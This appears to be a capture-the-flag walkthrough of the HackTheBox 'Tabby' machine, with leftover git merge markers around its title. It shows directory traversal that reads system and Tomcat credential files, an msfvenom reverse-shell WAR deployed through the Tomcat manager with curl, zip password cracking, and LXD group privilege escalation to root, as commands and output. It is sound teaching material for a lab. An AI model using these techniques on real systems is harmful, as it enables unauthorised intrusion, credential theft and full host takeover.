<<<<<<< HEAD
# Tabby | HackTheBox
=======
# Tabby | Hack The Box
>>>>>>> b87f06e415b6f89b91bb8ca3e722f6606cce131e

### 1. Scan
```bash
kali@kali:~$ sudo nmap -A -p- -T4 10.10.10.194
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-23 21:32 EDT
Nmap scan report for 10-10-10-194.tpgi.com.au (10.10.10.194)
Host is up (0.36s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-title: Apache Tomcat
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT       ADDRESS
1   355.35 ms 10.10.14.1
2   355.90 ms 10-10-10-194.tpgi.com.au (10.10.10.194)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1026.88 seconds
```
The scan shows that the target has SSH, an Apache web server and a Tomcat service active.

### 2. Enumerate HTTP services
Checking out the main web server first on port 80:
http://10.10.10.194/ - single page, nothing out of the ordinary except a link to http://megahosting.htb/news.php?file=statement, which needs to be changed to so directs to the IP address: http://10.10.10.194/news.php?file=statement. Using the Burp repeater we can inject other paths following the "file=" part. This allows for further enumeration, such as /etc/passwd:
```bash
GET /news.php?file=../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
...
```
and operating system info:
```bash
GET /news.php?file=../../../../etc/os-release

NAME="Ubuntu"
VERSION="20.04 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
```
I try for a bit longer, but after a while decide to move on.  
Now looking at the tomcat installation on http://10.10.10.194:8080.  
According to the available documentation, this version is Apache Tomcat 9, Version 9.0.31, Feb 24 2020. We can try and use our directory traversal point to find the tomcat creds which should be at "conf/tomcat-users.xml" according to the 401 screen.  
I do some further exploring using my previously-discovered enumeration point:
```bash
../../../../etc/systemd/system/tomcat.service 
[Unit]
Description=Tomcat 9 servlet container
After=network.target

[Service]
Type=forking

User=tomcat
Group=tomcat

Environment="JAVA_HOME=/usr/lib/jvm/default-java"
Environment="JAVA_OPTS=-Djava.security.egd=file:///dev/urandom -Djava.awt.headless=true"

Environment="CATALINA_BASE=/opt/tomcat/latest"
Environment="CATALINA_HOME=/opt/tomcat/latest"
Environment="CATALINA_PID=/opt/tomcat/latest/temp/tomcat.pid"
Environment="CATALINA_OPTS=-Xms512M -Xmx1024M -server -XX:+UseParallelGC"

ExecStart=/opt/tomcat/latest/bin/startup.sh
ExecStop=/opt/tomcat/latest/bin/shutdown.sh

[Install]
WantedBy=multi-user.target
```
With this information about where all Tomcat's configuration files SHOULD be, I wrote a script - see scan.py and wordlist.txt, to scan every tomcat install file inside /opt/tomcat/latest, however came up empty handed. I decide to spin up a VM using some handy Azure credits and install Tomcat and see where it is locally. By doing this, I discover another installation directory that is used for Debian installs.

Finally this leads me to finding the Tomcat users XML file:
```bash
/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml

<?xml version="1.0" encoding="UTF-8"?>
<!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
  NOTE:  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary. It is
  strongly recommended that you do NOT use one of the users in the commented out
  section below since they are intended for use with the examples web
  application.
-->
<!--
  NOTE:  The sample user and role entries below are intended for use with the
  examples web application. They are wrapped in a comment and thus are ignored
  when reading this file. If you wish to configure these users for use with the
  examples web application, do not forget to remove the <!.. ..> that surrounds
  them. You will also need to set the passwords to something appropriate.
-->
<!--
  <role rolename="tomcat"/>
  <role rolename="role1"/>
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
-->
   <role rolename="admin-gui"/>
   <role rolename="manager-script"/>
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
</tomcat-users>
```
The defined user account has permission to access the host-manager webapp, and manager scripting. Previously in a Pentesterlab exercise I have been shown how to get a webshell through the manager GUI using a war file - some research into the manager scripting role shows this is just a non-graphical interface to perform the same functions, therefore I should be able to do the same thing here, just in a different way.

### 3. Get a shell
Generate a WAR reverse shell:
```bash
kali@kali:~/temp$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.207 LPORT=4444 -f war > webshell.war
Payload size: 1092 bytes
Final size of war file: 1092 bytes
```

Use curl to send the file after many failed attempts (gotta get this command just right for it to work and it seems to change a bit with every tomcat version)
The reference that did it for me was: https://www.thetopsites.net/article/52386613.shtml
```bash
kali@kali:~/Desktop/htb/tabby$ curl -v -u tomcat:'$3cureP4s5w0rd123!' -T webshell.war 'http://10.10.10.194:8080/manager/text/deploy?path=/webshell&update=true'
*   Trying 10.10.10.194:8080...
* TCP_NODELAY set
* Connected to 10.10.10.194 (10.10.10.194) port 8080 (#0)
* Server auth using Basic with user 'tomcat'
> PUT /manager/text/deploy?path=/webshell&update=true HTTP/1.1
> Host: 10.10.10.194:8080
> Authorization: Basic dG9tY2F0OiQzY3VyZVA0czV3MHJkMTIzIQ==
> User-Agent: curl/7.68.0
> Accept: */*
> Content-Length: 1092
> Expect: 100-continue
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 100 
* We are completely uploaded and fine
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 
< Cache-Control: private
< Expires: Thu, 01 Jan 1970 00:00:00 GMT
< X-Content-Type-Options: nosniff
< Content-Type: text/plain;charset=utf-8
< Transfer-Encoding: chunked
< Date: Wed, 24 Jun 2020 07:41:00 GMT
< 
OK - Deployed application at context path [/webshell]
* Connection #0 to host 10.10.10.194 left intact
```

Check Netcat:
```bash
kali@kali:~/Desktop/htb/tabby$ nc -lvp 4444
Listening on 0.0.0.0 4444
Connection received on 10-10-10-194.tpgi.com.au 33966
whoami
tomcat
```

### 4. Enumerate some more
After popping this shell comes more enumeration. Looking through the Apache server html files, I find a files folder with some stuff.
```bash
cd /var/www/html 
ls

assets
favicon.ico
files
index.php
logo.png
news.php
Readme.txt

cd files
ls -l 
total 28
-rw-r--r-- 1 ash  ash  8716 Jun 16 13:42 16162020_backup.zip
drwxr-xr-x 2 root root 4096 Jun 16 20:13 archive
drwxr-xr-x 2 root root 4096 Jun 16 20:13 revoked_certs
-rw-r--r-- 1 root root 6507 Jun 16 11:25 statement
```

Nothing in here contains anything (the revoked certs file we can't read due to perms) but I can download the backup file and look through that. Except not really because it has a password. Luckily it's weak and fcrackzip is a thing.
```bash
kali@kali:~/Desktop/htb/tabby$ fcrackzip --dictionary -p /usr/share/wordlists/rockyou.txt -u 16162020_backup.zip

PASSWORD FOUND!!!!: pw == admin@it
```

Extracting and looking through the files, it's basically a backup of the /var/www/html files containing the website, but only a few pages and there doesn't appear to be anything new in there. Just diffing the files from the current versions reveals contact info has changed and some images were taken out - most likely this is literally just a backup of the website's starting template. That leaves me with just the password.

### 5. Get access to a user account with the password
SSH failed with a public key error. However, I could use the password to switch the the "ash" user using su.
```bash
su ash
admin@it

whoami
ash
```

### 6. Escalate privileges
At this point I get to spawning a tty shell to begin enumeration again. I thought the root vulnerability was probably a misconfiguration, as the machine was running the latest version of Ubuntu so kernel or pre-installed applications were probably secure.
```bash
python3 -c "import pty; pty.spawn('/bin/bash')"  
ash@tabby:/var/lib/tomcat9$ sudo -l
sudo -l
sudo: unable to open /run/sudo/ts/ash: Read-only file system
ash@tabby:~$ id
id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

During my hopeless round of enumeration which appeared to be going nowhere fast, the machine was reset, and a new folder appeared in the user's directory that I missed before.
```bash
ash@tabby:~$ ls -l
ls -l
total 5488
drwxr-xr-x 3 ash ash    4096 Jun 24 10:00 snap
-rw-r----- 1 ash ash      33 Jun 24 09:13 user.txt
```

There were several more directories nested within it, like so: snap -> lxd -> 14804, common, current -> .config -> config.yml. I discovered these files were related first off to snap, a Ubuntu package management system that is installed by default, and then LXD and LXC, which is an application for managing virtualised containers. I began looking further into it.
```bash
ash@tabby:~$ lxc
lxc
Description:
  Command line client for LXD

  All of LXD's features can be driven through the various commands below.
  For help with any of those, simply call them with --help.

Usage:
  lxc [command]

Available Commands:
  alias       Manage command aliases
  cluster     Manage cluster members
  config      Manage instance and server configuration options
  console     Attach to instance consoles
  copy        Copy instances within or in between LXD servers
  delete      Delete instances and snapshots
  exec        Execute commands in instances
  export      Export instance backups
  file        Manage files in instances
...
```

I was looking into vulnerabilities that allow for privilege escalation and discover this article: https://www.hackingarticles.in/lxd-privilege-escalation/. There is also an exploit script on exploit.db: https://www.exploit-db.com/exploits/46978.  

*"A member of the local “lxd” group can instantly escalate the privileges to root on the host operating system. This is irrespective of whether that user has been granted sudo rights and does not require them to enter their password. The vulnerability exists even with the LXD snap package.
LXD is a root process that carries out actions for anyone with write access to the LXD UNIX socket. It often does not attempt to match the privileges of the calling user. There are multiple methods to exploit this.
One of them is to use the LXD API to mount the host’s root filesystem into a container which is going to use in this post. This gives a low-privilege user root access to the host filesystem."*.

Looking back at the "ash" user's groups, I can see that the user is in the lxc group. This means that the user can access the host filesystem through a container using the LXD socket. First I have to create an alpine container file on my local machine, and then host both it and the exploit script on a web server so I can get them over the the victim machine. I can then wget them into a temporary folder on the machine and run them together.
```bash
lp.tar.gz  ex.sh
ash@tabby:~/.temp$ ./ex.sh -f alp.tar.gz
./ex.sh -f alp.tar.gz
[*] Listing images...

+--------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE          |
+--------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
| alpine | 7bdf53b6ce2b | no     | alpine v3.12 (20200624_09:38) | x86_64       | CONTAINER | 3.05MB | Jun 24, 2020 at 2:06pm (UTC) |
+--------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
Creating privesc
Device giveMeRoot added to privesc
~ # whoami
root
```